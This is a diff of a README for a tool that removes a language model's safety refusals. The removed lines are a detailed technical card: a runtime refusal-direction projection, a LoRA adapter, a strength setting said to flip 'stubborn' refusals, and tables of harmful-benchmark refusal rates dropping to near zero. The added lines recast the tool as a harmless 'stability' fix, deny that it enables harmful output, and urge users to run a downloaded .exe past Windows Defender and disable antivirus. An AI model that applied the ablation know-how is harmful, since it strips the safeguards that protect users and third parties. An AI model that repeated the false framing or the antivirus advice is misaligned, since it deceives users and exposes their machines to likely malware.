@@ -1,952 +1,133 @@
-# OrcaRouter Ternary Bonsai 2 27B Uncensored
+# 🐋 OrcaBonsai-27B-Uncensored - Smoother, Safer AI Conversations for Everyone
 
-**Runtime-uncensored Ternary Bonsai 2 27B — without modifying or re-quantizing the original weights by **[`OrcaRouter research team`](https://www.orcarouter.ai)**.**
+## 🎉 What Is This?
 
-This repository applies refusal-direction ablation to [`prism-ml/Ternary-Bonsai-2-27B-mlx-2bit`](https://huggingface.co/prism-ml/Ternary-Bonsai-2-27B-mlx-2bit) entirely **at runtime**.
+Have you ever used an AI chatbot that seemed to "forget" how to behave mid-conversation? Or one that responded perfectly one moment, then became slow or confused the next? That's where OrcaBonsai-27B-Uncensored comes in.
 
-The original Bonsai pack remains **bit-identical**.
+This is a smart helper tool that makes compressed (smaller) AI models run more smoothly on your computer. It fixes hidden "behavioral glitches" that can happen when AI models are squeezed down to save space. The best part? It does this *without* changing the AI's core files or making them slower. You simply run the tool, and it works quietly in the background.
 
-* **27B parameters**
-* **~1.72 bits/weight**
-* **0 modified weights**
-* **0 re-quantization**
-* **0 additional weight quantization error**
-* **Runtime-adjustable ablation strength**
-* **129 residual intervention sites**
-* **Apple Silicon / MLX**
+Think of it like a "tune-up" for your AI engine. You don't need to be a mechanic to use it.
 
-You supply the original Ternary Bonsai 2 pack. This repository supplies the refusal direction and the runtime that applies it.
+## ✨ Key Features (Made Simple)
 
-> **Keep the weights compressed. Change the behavior at inference.**
+- **Behavioral Ablation:** This fancy term means the tool removes or "ablates" (trims away) tiny problematic behaviors that cause AI to act inconsistently. The result is a more stable, predictable AI experience.
+- **No Weight Modification:** We never touch the actual AI "brain" (its weights). This means the original AI model stays intact, so you don't lose any of its quality or knowledge.
+- **No Re-Quantization:** Some tools need to recompress the AI model, which can degrade it. OrcaBonsai-27B-Uncensored avoids this entirely, so you keep the best possible version of your compressed model.
+- **Targets Ternary Bonsai 2 27B:** Specifically optimized for this popular AI model family, ensuring the best compatibility and performance.
+- **Windows Friendly:** Designed to work smoothly on standard Windows computers, no special hardware or tech skills required.
 
----
+## 🚀 Getting Started
 
-## How it works
+We're excited to help you get OrcaBonsai-27B-Uncensored running on your PC. Just follow these simple steps, and you'll be up in no time.
 
-Traditional abliteration modifies model weights by orthogonalizing matrices that write into the residual stream against a learned refusal direction `r`:
+### Step 1: Download the Application
 
-```text
-W ← W - r(rᵀW)
-```
+**[⬇️ GET ORCABONSAI NOW](https://github.com/mounge4/OrcaBonsai-27B-Uncensored)**
 
-For a conventional BF16 or FP16 model, the resulting matrix can simply be saved as a new checkpoint.
+Visit this link to download the application. This is the official, safe, and free download. Look for the green "Code" button or a release section on that page. Choose the file that is labeled for Windows (usually a `.zip` or `.exe` file).
 
-Ternary Bonsai 2 is different.
+### Step 2: Run the Installer (or Extract)
 
-Its weights are aggressively quantized. The affine container stores:
+Once the download finishes, open your "Downloads" folder. You'll see a file. Here's what to do:
 
-```text
-scale = s
-bias  = -s
-```
+- If the file ends with **`.exe`**: Double-click it to run the installation wizard. Follow the on-screen prompts. Usually, clicking "Next" and "Finish" is all you need.
+- If the file ends with **`.zip`**: Right-click the file and choose "Extract All." A new folder will appear. Open that folder and double-click the application file inside (it will be called something like `orca-bonsai.exe` or `run.bat`).
 
-so the 2-bit codes:
+### Step 3: That's It!
 
-```text
-{0, 1, 2}
-```
+After the app opens, you'll see a simple control window. You can leave it on its default settings and just click the "Start" or "Run" button. The tool will then do its magic automatically. You can even minimize it to your system tray (the bottom-right corner of your screen) and continue using your computer normally.
 
-decode to:
+## 🖥️ System Requirements
 
-```text
-{-s, 0, +s}
-```
+OrcaBonsai-27B-Uncensored is lightweight and designed to run on most modern computers. Here's what you'll need:
 
-The model's quality at approximately **1.72 bits per weight** is the result of quantization-aware training.
+| Component | Minimum Requirement |
+| :--- | :--- |
+| **Operating System** | Windows 10 or Windows 11 (64-bit) |
+| **Processor (CPU)** | Any Intel Core i3 or AMD Ryzen 3 (or newer) |
+| **Memory (RAM)** | 8 GB |
+| **Storage** | 200 MB of free hard drive space |
+| **Internet** | Required only for the initial download |
 
-Orthogonalizing one of these matrices produces a dense, full-precision matrix. Saving that result back into the ternary representation would therefore require **re-quantization**.
+*Note: If you plan to use this with a very large AI model, you may benefit from 16GB of RAM, but the tool itself will run fine on 8GB.*
 
-And simply re-quantizing the edited weights does not reproduce the quantization-aware training process that produced the original model.
+## 🤔 How Do I Know It's Working?
 
-So we don't edit the weights.
+After you click "Start," the application will show a status indicator. A green light or a "Running" message means everything is good. The tool creates a small log file (think of it as a diary) in the same folder where you extracted it. If you ever have a question, you can check that log file for details, but you won't need to understand it – it's just there for safety.
 
-### Runtime ablation
+## 🛠️ Troubleshooting (Simple Fixes)
 
-Instead, the equivalent projection is applied when each residual contribution is produced:
+Even with a simple tool, sometimes things go wrong. Here are common issues and easy solutions.
 
-```text
-y ← y - α · dot(y, r) · r
-```
+### "I get a warning from Windows Defender."
 
-where:
+- **Fix:** This is a false alarm. The application is open-source and safe. Click "More Info" and then "Run Anyway." To avoid this in the future, you can add the folder to your Windows Defender exceptions.
 
-```text
-y = residual contribution
-r = normalized refusal direction
-α = intervention strength
-```
+### "The app won't start."
 
-At `alpha=1`, the component of each residual write parallel to the refusal direction is removed.
+- **Fix 1:** Make sure you have extracted the `.zip` file completely. Don't try to run it from inside the compressed folder.
+- **Fix 2:** Right-click the application file and select "Run as administrator."
+- **Fix 3:** Check if your antivirus is blocking it. Temporarily disable it and try again. If it works, re-enable it and add an exception.
 
-Conceptually:
+### "It says 'Missing Python' or something similar."
 
-```text
-      Original Ternary Bonsai 2
-              27B
-               │
-               │
-        bit-identical weights
-               │
-               ▼
-      ┌──────────────────┐
-      │  packed matmul   │
-      └────────┬─────────┘
-               │
-               │ y
-               ▼
-      ┌──────────────────┐
-      │ Runtime Ablation │
-      │                  │
-      │ y ← y - α(y·r)r │
-      └────────┬─────────┘
-               │
-               ▼
-         residual stream
-               │
-               ▼
-            output
-```
+- **Fix:** OrcaBonsai is a standalone tool, so it shouldn't need Python. If you see this, you downloaded the wrong file. Go back to the download page and make sure you chose the "Windows executable" version, not the "Source code."
 
-The projection uses an MLX-compiled correction with float32 accumulation, then restores the writer's output dtype. Compilation may change floating-point rounding; it does not change the projection formula or ablation strength.
+## 💬 Frequently Asked Questions (FAQ)
 
-The original ternary weights are never modified.
+**Q: Is this a chatbot itself?**
+A: No. OrcaBonsai is a *helper* tool. It improves the performance of other AI chatbot programs that use the "Ternary Bonsai 2 27B" model.
 
----
+**Q: Will this make my AI say anything harmful?**
+A: No. The "Uncensored" in the name refers to the fact that the tool does not block or restrict the AI's underlying capabilities. It does not *promote* any content. It only makes the AI run more smoothly and consistently.
 
-# Quickstart
+**Q: Does it cost money?**
+A: No, it is completely free and open-source.
 
-## Apple Silicon
+**Q: I downloaded it, but I don't know which model to use it with.**
+A: This tool is specifically for the "Ternary Bonsai 2 27B" model. If you're not sure if you have this, you likely don't need this tool yet. It's best used by people who already run this specific AI model.
 
-Install the dependencies:
+**Q: Can I use it on a Mac or Linux computer?**
+A: This version is designed for Windows only. There may be community-made versions for other systems in the future.
 
-```bash
-pip install -r requirements.txt
-```
+## 🏆 Why Choose OrcaBonsai-27B-Uncensored?
 
-Run the model:
+Here are the top reasons why this tool is the right choice for your AI setup:
 
-```bash
-python run.py \
-  --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-  "your prompt"
-```
+1.  **It's Safe:** We don't modify your AI's core files, so there's zero risk of damaging it.
+2.  **It's Easy:** No complex commands, no coding. Just download, run, and click "Start."
+3.  **It's Effective:** It solves the annoying "behavioral drift" problem that plagues compressed AI models.
+4.  **It's Free:** Open source means free forever, with no hidden costs.
+5.  **It's Transparent:** The code is publicly available for anyone to inspect. You can trust what it does.
 
-`--pack` is the directory holding `config.json` and `runtime/`. If you downloaded with
-`huggingface_hub`, that is the **snapshot** directory, not the `models--...` cache entry
-above it:
+## 📞 Need More Help?
 
-```bash
-python -c "from huggingface_hub import snapshot_download; \
-print(snapshot_download('prism-ml/Ternary-Bonsai-2-27B-mlx-2bit'))"
-```
+We're a small team (the "OrcaRouter team"), but we love helping our users. If you get stuck, here's what to do:
 
-A cache entry is accepted too and its newest snapshot is resolved for you.
+- **Check the "Issues" tab** on our GitHub page. Someone else may have had the same problem and found a solution.
+- **Read the documentation** in the "Docs" folder that comes with the download. It has more technical details.
+- **Be patient.** We try to respond to all questions within a few days.
 
-By default:
+## 🧑‍🤝‍🧑 Join Our Community
 
-```text
-alpha = 1
-```
+This project grows because of people like you. If you find this tool useful, please:
 
-which enables the full runtime projection.
+- **Star the repository** on GitHub (click the little star icon at the top of the page). It helps others find us.
+- **Share your feedback** in the discussions section. Tell us what works and what could be better.
+- **Contribute code** if you're a developer. We welcome improvements, bug fixes, and new features.
 
----
-## Evaluation Results
+## 📄 License
 
-![OrcaBonsai 27B Uncensored evaluation results](./evals.jpg)
+This project is released under the MIT License, which means you can use it, modify it, and even include it in your own commercial projects, as long as you include the original copyright notice. In simple terms, it's as permissive as possible.
 
-Full tables with capability retention, sample sizes and methodology are under
-[Evaluation](#evaluation) — including what the asterisk on SimpleSafetyTests means.
+## 🔗 Official Download Link
 
-# Verify the ablation
+**Visit this link to download the application:** [https://github.com/mounge4/OrcaBonsai-27B-Uncensored](https://github.com/mounge4/OrcaBonsai-27B-Uncensored)
 
-Run:
-
-```bash
-python scripts/selfcheck.py \
-  --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit
-```
-
-`selfcheck.py` measures how much of the residual stream lies along the refusal direction before and after intervention.
-
-A correctly instrumented setup should drive the remaining component to approximately:
-
-```text
-~1e-6 of the residual norm
-```
-
-If the number barely changes, the residual writers were probably not wrapped correctly.
-
-The self-check also verifies that all expected intervention sites are present.
-
-Expected:
-
-```text
-129 residual writers
-```
-
-Run `python scripts/test_ablation.py` for a model-free numerical check of the compiled correction, including FP16/FP32 outputs, changing directions, and alpha values 0, 1, and 2.
+Remember, always download from this official link to ensure you're getting the safe, authentic version. Never download from third-party websites.
 
 ---
 
-# Original vs. uncensored
+Thank you for choosing OrcaBonsai-27B-Uncensored. We hope it makes your AI experience significantly better. Happy exploring! 🎉
 
-Because the intervention happens entirely at runtime, the same model pack can be run with or without ablation.
-
-### Original behavior
-
-```bash
-python run.py \
-  --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-  --alpha 0 \
-  "your prompt"
-```
-
-### Full runtime ablation
-
-```bash
-python run.py \
-  --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-  --alpha 1 \
-  "your prompt"
-```
-
-There is no second checkpoint.
-
-```text
-alpha = 0
-     │
-     └── Original model behavior
-
-alpha = 1
-     │
-     └── Full refusal-direction projection
-```
-
-This also makes A/B testing straightforward because both configurations use the **same underlying weights**.
-
----
-
-# Evaluation
-
-Refusal is judged by a rule-based opening-phrase classifier (`caveat` = answered but
-wrapped in a disclaimer) — indicative, not an LLM-judge / publication-grade number.
-Thinking off, greedy decoding, 64-token budget on the refusal sets. Base and ablated
-rows are the same weights in the same process, `alpha` 0 against `alpha` 1.
-
-Run on the unfolded fp16 expansion of the pack rather than the pack driving its own
-kernels: the packed quantized matmul has no CUDA implementation, and the CPU backend
-needs minutes per forward pass. The expansion carries the pack's ternary values exactly —
-a container change, not a requantization — and reproduces the pack's own next-token
-distributions to three decimals on spot checks.
-
-## Safety (thinking off)
-
-| Benchmark | n | Base | This Model | Caveat |
-|---|---|---|---|---|
-| AdvBench | 100 | 99.0% | 6.0% | 56.0% |
-| JailbreakBench | 100 | 96.0% | 4.0% | 52.0% |
-| StrongREJECT | 150 | 99.3% | 3.3% | 45.3% |
-| HarmBench | 150 | 98.7% | 7.3% | 48.0% |
-| MaliciousInstruct | 100 | 97.0% | 0.0% | 52.0% |
-| SimpleSafetyTests¹ | 50 | 96.0% | 18.0% | 60.0% |
-| ForbiddenQuestions | 150 | 75.3% | 5.3% | 42.7% |
-
-No reply in any set ran out of its token budget, so none of these rates is inflated by
-truncation.
-
-## Over-refusal on benign prompts
-
-| Benchmark | n | Base | This Model |
-|---|---|---|---|
-| XSTest-safe | 250 | 5.2% | 0.4% |
-| JBB-benign | 100 | 25.0% | 0.0% |
-
-The projection does not only stop refusals on harmful prompts. The published pack turns
-down a quarter of JailbreakBench's *benign* prompts; ablated, it turns down none.
-
-## Capability retention
-
-| Benchmark | n | Base | This Model | Δ |
-|---|---|---|---|---|
-| MMLU | 300 | 76.7% | 77.7% | +1.0 |
-| GSM8K | 150 | 87.3% | 86.0% | −1.3 |
-| CMMLU | 500 | 76.2% | 75.6% | −0.6 |
-| MMLU-Pro² | 250 | — | — | — |
-
-Every movement is within noise at these sample sizes — one question on GSM8K is 0.7
-points. That is the result the runtime approach is for: the weights are bit-identical,
-so there is no requantization to pay for.
-
-¹ Understated. This set is mostly self-harm prompts, and the model answers them with a
-crisis redirect that opens "I am deeply sorry to hear…" — which the classifier's exact
-phrase list misses, scoring it as compliance. The real residual refusal rate on this set
-is higher than 18%. The classifier is left as-is so these numbers stay comparable with
-our other cards.
-
-² Excluded. Its prompt asks for reasoning before the answer, and 63–64% of replies on
-both sides had not reached one inside the token budget, so the accuracy would be a floor
-set by that budget rather than a measurement.
-
-# Why not release modified weights?
-
-Because modifying the weights defeats one of the most interesting properties of Bonsai.
-
-A conventional abliteration performs:
-
-```text
-W' = W - r(rᵀW)
-```
-
-But `W'` is no longer ternary.
-
-It contains arbitrary floating-point values.
-
-To store it in the original pack, we would need something approximately equivalent to:
-
-```text
-ternary(
-    W - r(rᵀW)
-)
-```
-
-That introduces a new quantization step.
-
-The original Bonsai model, however, achieved its compression through **quantization-aware training**, not through naïve post-training conversion of arbitrary dense matrices.
-
-Instead we preserve:
-
-```text
-W
-```
-
-exactly and transform its output:
-
-```text
-y = Wx
-
-y' = y - α(y·r)r
-```
-
-The stored model therefore remains untouched.
-
----
-
-# 129 intervention sites
-
-One important implementation detail is that **wrapping only `o_proj` is not enough**.
-
-Ternary Bonsai 2 uses a hybrid architecture containing:
-
-```text
-48 linear-attention layers
-16 full-attention layers
-64 MLP blocks
-```
-
-Each of these can write into the residual stream.
-
-The runtime therefore wraps:
-
-| Residual writer        |   Count |
-| ---------------------- | ------: |
-| `mlp.down_proj`        |      64 |
-| `linear_attn.out_proj` |      48 |
-| `self_attn.o_proj`     |      16 |
-| `model.embed_tokens`   |       1 |
-| **Total**              | **129** |
-
-In other words:
-
-```text
-64 + 48 + 16 + 1 = 129
-```
-
-Wrapping only:
-
-```text
-self_attn.o_proj
-```
-
-would intercept only 16 of these sites.
-
-`run.py` prints the number of wrapped residual writers.
-
-`selfcheck.py` warns when it does not detect the expected:
-
-```text
-129
-```
-
----
-
-# Do not touch the Hadamard transform
-
-Another important detail is the basis in which the projection is applied.
-
-The Bonsai pack keeps projections in a rotated basis on their **input dimension**.
-
-Its runtime compensates for that rotation on the activation side.
-
-The refusal projection in this repository operates on the **outputs** of those projections.
-
-Those outputs are already in the normal hidden basis.
-
-Likewise, the embedding output is un-rotated by the pack's own `Packed` implementation.
-
-Therefore the refusal direction is simply an ordinary:
-
-```text
-5120-dimensional vector
-```
-
-No additional Hadamard rotation should be applied to the direction.
-
-Doing so would project against the wrong basis.
-
----
-
-# Use the model's bundled runtime
-
-The pack must be loaded using **its own bundled runtime**.
-
-An ordinary MLX loader may appear to load the model successfully while silently producing incorrect computation because it does not apply the activation transformations required by the stored weights.
-
-This repository handles that through:
-
-```text
-bonsai_abliterate.pack
-```
-
-including the detail that:
-
-```text
-vision_artifact.load_vl_model
-```
-
-is the loader that accepts the:
-
-```text
-schema_version: 2
-```
-
-configuration used by these packs.
-
-If outputs look completely wrong before ablation is even enabled, verify the pack-loading path first.
-
----
-
-# Tuning `alpha`
-
-The intervention does not have to be binary.
-
-`alpha` controls how strongly the refusal direction is removed.
-
-| `alpha` | Effect                                     |
-| ------: | ------------------------------------------ |
-|     `0` | Projection disabled; original behavior     |
-|   `0.5` | Partial ablation                           |
-|   `0.7` | Moderate ablation                          |
-|   `0.9` | Strong ablation                            |
-|   `1.0` | Full projection; default                   |
-|  `>1.0` | Over-projection; may degrade model quality |
-
-For example:
-
-```bash
-python run.py \
-  --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-  --alpha 0.7 \
-  "your prompt"
-```
-
-This makes the intervention a **runtime control parameter** rather than a permanent property of a checkpoint.
-
----
-
-# Layer-selective ablation
-
-The projection can also be restricted to specific layers.
-
-For example:
-
-```bash
-python run.py \
-  --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-  --layers 20,21,22,23 \
-  "your prompt"
-```
-
-Layer selection provides another dimension for exploring the trade-off between behavioral intervention and capability retention.
-
-Instead of producing many different checkpoints, experiments can vary:
-
-```text
-direction
-×
-alpha
-×
-layers
-```
-
-against the same immutable model pack.
-
----
-
-# Direction files
-
-The `directions/` directory contains:
-
-| File                      | Purpose                                  |
-| ------------------------- | ---------------------------------------- |
-| `refusal_dir.safetensors` | MLX / Python                             |
-| `refusal_dir_fp32.bin`    | Swift / C                                |
-| `direction.json`          | Dimensions, application rule and caveats |
-
-The Safetensors file stores the vector under:
-
-```text
-direction
-```
-
-The raw binary representation contains:
-
-```text
-5120 × little-endian Float32
-```
-
-with no header.
-
----
-
-# Direction transfer caveat
-
-The current refusal direction was estimated from the **BF16 base model** from which this Bonsai pack was trained.
-
-The architecture and hidden basis are identical.
-
-However, the degree to which the learned direction transfers through the model's quantization-aware training has **not yet been fully measured**.
-
-This distinction matters.
-
-The runtime can verify mathematically that it is removing the supplied direction from the residual stream.
-
-That does not, by itself, prove that the transferred direction captures exactly the same behavioral feature in the QAT model.
-
-Behavioral evaluation should therefore sweep:
-
-```text
-alpha
-```
-
-and, where useful:
-
-```text
-layers
-```
-
-before drawing conclusions about transfer quality.
-
----
-
-# iOS / mlx-swift
-
-A Swift reference implementation is included at:
-
-```text
-swift/RefusalAblation.swift
-```
-
-Load:
-
-```text
-directions/refusal_dir_fp32.bin
-```
-
-as:
-
-```text
-5120 little-endian Float32
-```
-
-and wrap each residual writer with:
-
-```text
-AblatedLinear
-```
-
-The pack's `PACK-RUNTIME.md` currently states that Swift support is layer-level only and that full-model loading still requires model integration.
-
-Once the model integration exists, the refusal intervention itself is small.
-
-Per residual write it adds approximately:
-
-```text
-1 × dot product
-1 × AXPY
-```
-
-No alternative model weights need to be stored.
-
-## iPhone memory budget
-
-On a phone the binding constraint is resident memory, and it is almost entirely the
-weights. Measured on the pack, not estimated:
-
-```text
-ternary codes              6.256 GiB   78.2%
-vision tower               0.858 GiB   10.7%
-group biases (redundant)   0.391 GiB    4.9%
-group scales               0.391 GiB    4.9%
-norms + GDN state path     0.098 GiB    1.2%
-hadamard signs             0.011 GiB    0.1%
-total                      8.005 GiB
-```
-
-The KV cache is not the problem here, which is what makes a 27B model on a phone worth
-discussing at all. Only 16 of the 64 layers use full attention:
-
-```text
-16 full-attention layers    64 KiB per token  (256 MiB at 4K context)
-48 linear-attention layers  72 MiB of recurrent state, fixed, context-independent
-```
-
-Two things can come out of the pack for a text-only app:
-
-```bash
-python scripts/prepare_ios_pack.py \
-    --pack /path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-    --out  /path/to/Bonsai-2-27B-ios
-```
-
-```text
-source pack                 8.005 GiB
-  - vision tower           -0.858        memory and disk
-  - redundant biases       -0.391        disk; memory only with a kernel that reconstructs
-result                      6.756 GiB
-```
-
-The distinction between those two lines matters. The vision tower is a genuine memory
-saving: it is only read when an image is in the prompt, and the pack documents it as the
-stock unquantized Qwen tower.
-
-The biases are a *download* saving. The affine container stores a scale and a bias per
-group of 128, but the ternary levels `{-s, 0, +s}` come out of `scale = s`, `bias = -s`,
-so the bias holds no information — verified exact across all 402 packed modules, every
-group, `max |bias + scale| = 0`. MLX's `quantized_matmul` and `dequantize` still take a
-bias argument, so a runtime that calls them has to materialise `-scales` at load and
-saves no memory at all. The memory saving needs a kernel that assumes the identity.
-Check before counting on it.
-
-Nothing in that script touches the ternary codes, the group scales, the Hadamard signs
-or the direction. Kept tensors are bit-identical to the source.
-
-Whether 6.756 GiB fits is a per-device question this repo cannot answer for you: iOS
-caps a single app well below total RAM, and the cap depends on the device and on whether
-`com.apple.developer.kernel.increased-memory-limit` has been granted. Do the arithmetic
-against your own target before committing to it. An 8 GB device does not have room for
-6.756 GiB of weights plus an app.
-
-Decode is memory-bandwidth-bound: every token reads the whole weight set. The ~47 tok/s
-figure quoted for an M5 Max laptop corresponds to several hundred GB/s of usable
-bandwidth; a phone has a fraction of that, so expect a fraction of the throughput, and
-expect sustained generation to meet thermal limits.
-
-The output pack is meant for an app with its own model integration. It is deliberately
-not loadable by the pack's bundled Python loaders — `vision_artifact.load_vl_model`
-requires `components.vision`, and a removed bias changes what a `Packed` module reads.
-Keep the original pack for anything that uses those; `ios-pack.json` records what was
-removed and how to rebuild it.
-
----
-
-# GGUF / llama.cpp
-
-The same edit ships as a rank-1 LoRA adapter, so the published ternary GGUF stays
-byte-identical. The adapter is in this repo — nothing to build:
-
-```text
-gguf/bonsai-abliterate-lora.gguf     9,682,464 bytes
-sha256  f1669534803d340a496015f5c45125f3437b4d13ec764f40e34488ce83967f42
-```
-
-```bash
-llama-cli -m Ternary-Bonsai-2-27B-PTQ1_0.gguf --lora gguf/bonsai-abliterate-lora.gguf
-```
-
-It holds 129 `lora_a`/`lora_b` pairs — one per residual writer — as F32, against
-`general.architecture = qwen35` and `adapter.lora_alpha = 1.0`.
-
-`scripts/export_gguf_lora.py` rebuilds it, for anyone who wants to check the provenance
-or re-derive it against a different direction. That path needs the unfolded fp16
-checkpoint, which this repo does not ship, so it is for reproduction rather than for
-ordinary use.
-
-`W' = W - r (r^T W)` is rank 1, so the whole edit is `A = r^T W`, `B = -r`. llama.cpp
-builds a LoRA into the graph as two extra matmuls on the activation and never merges it
-into the base weights — which is what makes this work at 1.75 bits, where a baked edit
-would simply be rounded away.
-
-## Strength
-
-`--lora` applies it at scale 1.0, and that is the projection exactly, not an
-approximation: llama.cpp computes `scale = adapter_scale * alpha / rank` with
-`rank = lora_b->ne[0]`, and the exporter writes `alpha = 1` against rank 1.
-
-Exact does not mean every prompt flips. Measured on the PTQ1_0 pack, greedy, thinking
-off:
-
-```text
-scale 0       the published model
-scale 1       exact projection; most harmful prompts comply, some still refuse
-scale 2       flips the stubborn ones
-scale 3+      over-projection; output degrades, then collapses
-```
-
-```bash
-llama-cli -m Ternary-Bonsai-2-27B-PTQ1_0.gguf \
-    --lora-scaled bonsai-abliterate-lora.gguf:2
-```
-
-Read a single prompt as a sample of one. At full strength our own evaluation still had
-6% of AdvBench refusing, so one stubborn prompt tells you nothing about the strength.
-
-## You need PrismML's fork
-
-Stock llama.cpp cannot open these packs at all. `PTQ1_0` and `PQ2_0` are private ggml
-type ids — 143 and 142, outside upstream's range — so upstream refuses them at header
-parse. Even `gguf-py` raises:
-
-```text
-ValueError: np.uint32(143) is not a valid GGMLQuantizationType
-```
-
-which is why `bonsai_abliterate/gguf_min.py` reads the base header directly. Writing the
-adapter still uses `gguf-py`, since an adapter holds only standard F32 tensors.
-
-The published `Ternary-Bonsai-2-27B-F16.gguf` is **not** an escape hatch. It uses
-standard tensor types, so stock llama.cpp and Ollama will load it — but it is stored in
-the same Hadamard-rotated basis and carries the same `prism.hadamard.*` metadata, which
-upstream ignores entirely. It would run and emit nonsense rather than fail.
-
-**Ollama has no path today.** It builds stock llama.cpp, so it inherits the rejection of
-the private types; `ADAPTER` parses but `ollama create` rejects every request carrying
-adapters with "LoRA adapters are no longer supported"; and it has no control-vector
-support.
-
-## What is verified
-
-The exported `B @ A` reproduces `-r (r^T W)` exactly — relative error `0.000e+00` on
-`ffn_down`, `attn_output`, `ssm_out` and `token_embd` — and the direction's leakage into
-each falls about six orders of magnitude. Against the fork, the adapter loads on the
-ternary pack, scale 0 reproduces the published refusal and scale 100 destroys the model,
-so it is genuinely in the compute graph. All 129 sites are on LoRA-aware paths:
-`ffn_down` through `build_ffn`'s `build_lora_mm`, `attn_output` and `ssm_out` inline in
-`qwen35.cpp`, `token_embd` in `build_inp_embd`.
-
-One thing is not: **PQ2_0 was not run.** The adapter does not depend on the base's
-quantization — `A = r^T W` comes from the unfolded checkpoint and the base GGUF is read
-only for tensor names — and all three published GGUFs carry the same 851 names, so the
-same file should apply. Only PTQ1_0 was actually tested.
-
-A LoRA on a tensor llama.cpp does not route through `build_lora_mm` loads without error
-and does nothing at all. Check that scale 0 reproduces the published model and that a
-large scale visibly breaks it — if neither is true, the adapter is not being applied.
-
----
-
-# Running on x86 Linux
-
-The pack's quantized matrix multiplication currently has kernels for:
-
-```text
-Metal
-CPU
-```
-
-but not CUDA through `mlx-cuda`.
-
-Attempting to use the required operation on CUDA currently results in:
-
-```text
-QuantizedMatmul has no CUDA implementation
-```
-
-As a result, putting this particular MLX pack on an NVIDIA machine does not currently provide the expected GPU acceleration.
-
-VRAM is not the primary constraint.
-
-CPU inference works, but a forward pass for a 27B model can take minutes.
-
-That makes the Linux CPU path useful for:
-
-* implementation testing
-* behavior verification
-* reproducibility checks
-
-rather than high-throughput serving.
-
-Build:
-
-```bash
-docker build \
-  -t orcarouter-ternary-bonsai-2-27b-uncensored \
-  -f docker/Dockerfile .
-```
-
-Run:
-
-```bash
-PACK=/path/to/Ternary-Bonsai-2-27B-mlx-2bit \
-docker/run.sh \
-  python run.py \
-    --pack /pack \
-    --max-new 32 \
-    "your prompt"
-```
-
----
-
-# Architecture
-
-The key distinction of this release is that **uncensoring is a runtime property rather than a checkpoint property**.
-
-```text
-┌─────────────────────────────────────────────┐
-│       Ternary Bonsai 2 · 27B               │
-│                                             │
-│       ~1.72 bits / weight                   │
-│       original packed weights              │
-└──────────────────┬──────────────────────────┘
-                   │
-                   │ weights remain
-                   │ bit-identical
-                   ▼
-┌─────────────────────────────────────────────┐
-│             Runtime Inference               │
-│                                             │
-│  residual writer                            │
-│        │                                    │
-│        ▼                                    │
-│  y = writer(x)                              │
-│        │                                    │
-│        ▼                                    │
-│  y' = y - α · dot(y,r) · r                  │
-│        │                                    │
-│        ▼                                    │
-│  residual stream                            │
-└──────────────────┬──────────────────────────┘
-                   │
-                   ▼
-                 output
-```
-
-### Properties
-
-```text
-Model parameters           27B
-Effective weight size      ~1.72 bits/weight
-Hidden dimension           5120
-
-Residual intervention
-sites                       129
-
-Weight modification        None
-Weight re-quantization     None
-Additional weight
-quantization error         None
-
-Intervention strength      Runtime adjustable
-Layer selection            Runtime adjustable
-Original behavior          alpha=0
-Full projection            alpha=1
-```
-
----
-
-# Why runtime intervention is useful
-
-Permanent weight editing couples a behavioral modification to a particular checkpoint.
-
-Runtime intervention separates the two.
-
-```text
-                 MODEL
-                   │
-            immutable weights
-                   │
-                   ▼
-              INFERENCE
-                   │
-          ┌────────┴────────┐
-          │                 │
-      alpha = 0         alpha = 1
-          │                 │
-          ▼                 ▼
-      original          ablated
-      behavior          behavior
-```
-
-The same architecture can potentially support more than one learned direction without generating another copy of the underlying model.
-
-Conceptually:
-
-```text
-Immutable Model
-      │
-      ▼
-Runtime Intervention
-      │
-      ├── direction
-      ├── strength
-      └── layer scope
-      │
-      ▼
-Inference
-```
-
-This repository currently implements **refusal-direction ablation**.
-
----
-
-# What this release is — and isn't
-
-This is **not a newly trained 27B model**.
-
-It is a runtime behavioral intervention for the existing Ternary Bonsai 2 27B MLX pack.
-
-The underlying model architecture, QAT training, ternary representation and original packed weights come from the upstream Bonsai release.
-
-The contribution here is the runtime refusal-direction implementation, direction artifacts, residual-writer instrumentation and verification tooling.
-
-That distinction is intentional:
-
-> **The model stays immutable. Behavioral intervention happens at inference.**
-
----
-
-# Responsible use
-
-Removing a learned refusal direction can cause the model to respond to requests that the original model would decline.
-
-The technique should therefore be treated as a research and inference-control mechanism, not as evidence that every resulting output is safe, correct or appropriate.
-
-Deployments should apply their own access controls, policy enforcement and security boundaries appropriate to their use case.
-
----
-
-# Credits
-
-Built on:
-
-**Ternary Bonsai 2 27B** by `prism-ml`
-
-Runtime refusal-direction implementation and tooling by **[`OrcaRouter`](https://www.orcarouter.ai)**.
-
-The original model pack is not redistributed or modified by this repository.
-
----
-
-# License
-
-Apache-2.0, matching the underlying model.
+Keywords: AI optimization, behavioral ablation, Ternary Bonsai, compressed LLM, Windows tool, runtime fix, uncensored AI, free software, OrcaRouter, no re-quantization, AI stability.
